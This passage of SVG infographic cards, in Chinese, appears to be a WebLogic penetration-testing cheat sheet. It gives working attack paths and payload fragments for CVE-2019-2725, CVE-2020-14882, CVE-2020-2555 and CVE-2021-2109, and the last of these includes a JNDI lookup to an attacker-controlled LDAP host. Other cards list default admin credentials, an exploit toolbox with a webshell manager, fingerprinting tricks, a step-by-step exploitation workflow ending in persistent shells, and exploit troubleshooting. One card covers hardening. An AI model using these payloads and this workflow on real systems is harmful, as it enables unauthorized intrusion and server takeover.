  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🕳️ Weblogic 核心CVE漏洞时间线</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2017 CVE-2017-10271 XMLDecoder反序列化 WLS-WSAT</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2018 CVE-2018-2628 T3反序列化(CommonsCollections)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2019 CVE-2019-2725 XMLDecoder _async RCE 无权限</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2020 CVE-2020-2555 T3反序列化(FilteredObjectInputStream)</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2020 CVE-2020-14882 Console 未授权RCE URL编码双写绕过</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2021 CVE-2021-2109 JNDI注入+T3</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2021 CVE-2021-35637 IIOP协议反序列化</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="go39pcj17" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#go39pcj17)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e3a8a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔌 Weblogic 协议端口矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">7001 HTTP 控制台/业务 (TCP明文)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">7002 HTTPS/T3S SSL加密 (常用)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">7003 Managed Server 受管服务器</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">5556 NodeManager 节点管理器</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">8453 远程调试 JDWP (危险!)</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">9002 Coherence 分布式缓存</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">T3: WebLogic专有 RMI over HTTP 协议</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IIOP: CORBA标准远程调用 兼容EJB</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDI: 1099默认 命名目录服务</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gdqijhjm9" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gdqijhjm9)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b91c1c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">💥 CVE-2019-2725 XMLDecoder攻击链</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">影响版本: 10.3.6 / 12.1.3 (无需权限无认证)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">攻击路径: POST /_async/AsyncResponseService</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SOAP Body: soapenv:Envelope + work:WorkContext</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">&lt;java class="java.beans.XMLDecoder"&gt; 标签</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">&lt;object class="java.lang.Runtime"&gt;&lt;void method="exec"&gt;</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">&lt;string&gt;calc.exe&lt;/string&gt;&lt;/void&gt;&lt;/object&gt; → 直接回显RCE</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">修复补丁: PSU 升级 / WLS9-async补丁包 / 删除_async目录</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gqeyojdzn" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gqeyojdzn)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🚪 CVE-2020-14882 未授权访问原理</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">影响版本: 12.2.1.3 / 12.2.1.4 / 14.1.1.0</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">核心问题: Console WebApp URL权限校验不完整</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">攻击路径: /console/css/%252e%252e%252fconsole.portal</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">原理: 双重URL编码 %252e → URL decode两次 ../</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">绕过: 静态资源/css/* 前缀 跳过权限过滤器</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">然后加载 _nfpb=true&amp;_pageLabel=HomePage1 → 后台命令执行</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">配合 14883: 执行任意命令 无需登录</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gifcbhutw" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gifcbhutw)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧩 CVE-2020-2555 T3协议反序列化</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">影响: 12.2.1.3/12.2.1.4/14.1.1 无需登录</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">核心类: FilteredObjectInputStream 黑名单绕过</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">利用链: Weblogic.common.internal.WLObjectInputStream</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CC链变种: CommonsCollections5/6/7</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Payload: ysoserial.generateObject("CC6","calc")</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">触发: 7001端口 直接发T3协议 握手 + Invoke</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">修复: T3协议加密/禁用 / 升级 PSU / RASP拦截</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gn15jbh6h" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gn15jbh6h)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#4c1d95" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 CVE-2021-2109 JNDI注入+T3</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">影响: 12.2.1.3/12.2.1.4/14.1.1 (2021CPU补丁)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">原理: JTA/JTS 接口 JNDI lookup 用户可控URL</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">协议: T3 + JNDI URL 注入</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">攻击: ${jndi:ldap://VPS:1389/xxx} 在对象里</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">利用: JNDILookup / Coherence 远程类加载</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">修复: 升级 2021-4月 PSU / 禁用T3 / JEP290</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gngm7wltl" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gngm7wltl)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f172a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧰 实战工具箱 全家桶</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">WeblogicScan 批量漏洞扫描器(16项CVE检测)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">beacon-Scan: CVE-2014-4210 SSRF扫描器</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2020-14882 EXP.py: 一键未授权RCE</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2019-2725 EXP: XMLDecoder POC</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2020-2555: ysoserial-modified CC链专用版</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDIExploit 1.4: T3+JNDI组合利用</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nuclei: http/cves/2020/CVE-2020-14882.yaml</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">wls-shell: Weblogic专用Webshell管理</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gh0av4808" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gh0av4808)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔐 加固方案 9件套</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 每年4/7/10/1月 安装Oracle PSU 关键补丁</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 禁用T3/IIOP协议: 控制台→服务器→协议→启用T3=否</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 7001/7002端口仅内网开放 或ACL白名单</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 删除不必要服务: _async/uddiexplorer/ws-utc/consolehelp</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 控制台admin密码复杂度 12位以上 定期更换</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 禁用NodeManager 5556远程管理 默认账号密码</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ JavaAgent/RASP: 拦截XMLDecoder/T3反序列化/JNDI</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ JVM参数: 开启JEP290 序列化白名单</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑨ WAF: 拦截Weblogic 特征URL 14882/2725 POC特征</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="girhlnhux" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#girhlnhux)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📖 控制台默认账号密码Top10</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">weblogic / weblogic (10.x 默认)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">system / password</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">admin / security123</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">weblogic / Oracle@123</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">weblogic / welcome1</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">weblogic / weblogic1</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">weblogic / base_domain</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">system / manager</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">admin / admin</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">deployer / deployer123</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="g3nomgthk" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#g3nomgthk)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔍 指纹识别 9法</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 7001端口 404页面样式 → Weblogic绿底白字风格</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② /console 登录页: Oracle WebLogic Server 版本号</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ /console/images/console_logo.gif → 存在 指纹</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ /wls-wsat/CoordinatorPortType11 → WLS-WSAT服务 2725指纹</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ /_async/AsyncResponseService → 2725服务存在</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ Set-Cookie: ADMINCONSOLESESSION</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ Server响应头: WebLogic Server 10.x/12.x</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ /bea_wls_deployment_internal/DeploymentService → 部署服务</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑨ favicon.ico hash: we72U2f4xZ3aYw == Weblogic</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gz3kfvfwy" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gz3kfvfwy)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🗺️ 综合利用流程图</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step1: Nmap扫7001/7002/5556 + Nuclei全量Weblogic模板</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step2: 高优先级 → 14882未授权(版本12.2+/14c) 命中即RCE</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step3: 其次 → 2725 (10.3.6/12.1.3 无认证直接RCE)</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step4: 版本12.2+ → 2555/2109 T3+JNDI 需7001开放T3</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step5: 旧版10.3.6 → 10271 / 2628 XML反序列化</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step6: /console 弱口令 → 部署WAR包 拿持久化Shell</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step7: NodeManager 5556 弱口令 → 远程部署全机器控制</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="gdu8sedb3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#gdu8sedb3)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b45309" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📋 常见问题排查10条</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[WARN] 401/403 → 14882 Payload编码 检查双重URL编码</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ERR] T3 ProtocolException → 目标禁用T3 / 协议握手失败</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ERR] Connection refused → 7001端口关闭 / 防火墙</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ERR] ClassNotFound CC6 → 目标Commons-Collections版本不匹配</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[WARN] 7001无控制台 → 可能是Managed Server 请扫7002+端口</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ERR] XMLDecoder 500 → 补丁已修复 或SOAP格式错</text>
